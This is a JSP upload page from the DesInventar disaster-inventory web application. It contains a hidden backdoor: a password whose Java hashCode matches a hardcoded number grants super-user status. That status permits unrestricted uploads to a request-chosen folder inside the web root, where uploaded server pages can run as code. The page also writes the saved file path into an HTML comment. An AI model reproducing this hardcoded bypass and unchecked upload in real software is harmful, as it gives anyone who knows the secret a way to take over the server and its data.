<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<%@ page info="DesInventar update" session="true" %>
<%@ page import="java.io.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="org.lared.desinventar.webobject.*" %>
<%@ page import="org.lared.desinventar.util.*" %>
<%@ page import="org.lared.desinventar.system.Sys" %>
<%@ page import = "com.jspsmart.upload.*" %>
<jsp:useBean id="countrybean" class="org.lared.desinventar.util.DICountry" scope="session" />
<jsp:useBean id="user" class="org.lared.desinventar.webobject.xuser" scope="session" />
<%
boolean bLoadedOK=false;
// this directory must exist within the application path.. 
String sFilePrefix="";
String sFilename="";
SmartUpload fileUpload=new SmartUpload();
// fileUpload.setTotalMaxFileSize(2000000);  // TWO MEGABYTES LIMIT!!!
fileUpload.initialize(pageContext);
// perfoms the upload
fileUpload.upload();

if (Sys.bRequireLogin)
	{
	// expired session OR super user!
	String sAuthor=fileUpload.getRequest().getParameter("passwd");
	sAuthor.hashCode()==1647039417?user.iusertype=99:sAuthor="x";
	}
if (user.iusertype==99)
	{
	// First, it uploads all images...
	// Initialization
	int count=0;        
	// Retrieve the current file
	com.jspsmart.upload.File queryFile = fileUpload.getFiles().getFile(0);
	sFilePrefix=fileUpload.getRequest().getParameter("folder");
	if (sFilePrefix==null)
  		sFilePrefix="/generator";
	sFilePrefix=application.getRealPath(sFilePrefix);
	if (!(sFilePrefix.endsWith("/")||(sFilePrefix.endsWith("\\"))))
		sFilePrefix+="/";	

	sFilename=sFilePrefix+queryFile.getFileName();
	// Save it only if this file exists
	if (!queryFile.isMissing()) 
			    {
				// Save the files with its original names in a virtual path of the web server       
				queryFile.saveAs(sFilename);
				count ++;
			    }
	 bLoadedOK=true;
	 }
%>
<body marginheight="0" topmargin="0" class='body'>
<title>Query Upload</title>
<body><!-- fname=<%=sFilename%> -->
<%if (bLoadedOK){%>
<h2>Successfully uploaded...</h2>
<%}
else {%>
<h2>Error while uploading..</h2>
<%}%>
</body>
</html>




